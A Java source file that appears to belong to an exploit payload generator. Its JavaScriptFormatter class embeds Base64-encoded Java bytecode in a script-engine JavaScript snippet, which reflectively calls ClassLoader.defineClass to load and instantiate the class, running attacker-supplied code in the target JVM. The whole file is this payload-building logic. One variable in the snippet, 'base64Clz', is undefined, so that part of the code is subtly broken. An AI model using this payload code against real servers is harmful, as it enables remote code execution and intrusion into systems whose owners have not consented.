package jeg.common.format;

import jeg.common.config.Config;
import jeg.common.util.Base64Util;

public class JavaScriptFormatter implements IFormatter {
    public byte[] transform(byte[] bytes, Config config) throws Exception {
        String strJS = "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "try{\n" +
                "    classLoader.loadClass(\""+ config.getClassNameInFormatter() +"\").newInstance();\n" +
                "}catch (e){\n" +
                "    var clsString = classLoader.loadClass('java.lang.String');\n" +
                "    var bytecodeBase64 = \""+ Base64Util.encodeToBase64(bytes).replace("\n", "").replace("\r", "") + "\";\n" +
                "    var bytecode;\n" +
                "    try{\n" +
                "        var clsBase64 = classLoader.loadClass(\"java.util.Base64\");\n" +
                "        var clsDecoder = classLoader.loadClass(\"java.util.Base64$Decoder\");\n" +
                "        var decoder = clsBase64.getMethod(\"getDecoder\").invoke(base64Clz);\n" +
                "        bytecode = clsDecoder.getMethod(\"decode\", clsString).invoke(decoder, bytecodeBase64);\n" +
                "    } catch (ee) {\n" +
                "        var datatypeConverterClz = classLoader.loadClass(\"javax.xml.bind.DatatypeConverter\");\n" +
                "        bytecode = datatypeConverterClz.getMethod(\"parseBase64Binary\", clsString).invoke(datatypeConverterClz, bytecodeBase64);\n" +
                "    }\n" +
                "    var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');\n" +
                "    var clsByteArray = classLoader.loadClass('[B');\n" +
                "    var clsInt = java.lang.Integer.TYPE;\n" +
                "    var defineClass = clsClassLoader.getDeclaredMethod(\"defineClass\", clsByteArray, clsInt, clsInt);\n" +
                "    defineClass.setAccessible(true);\n" +
                "    var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,0,bytecode.length);\n" +
                "    clazz.newInstance();\n" +
                "}";
        return strJS.getBytes();
    }
}
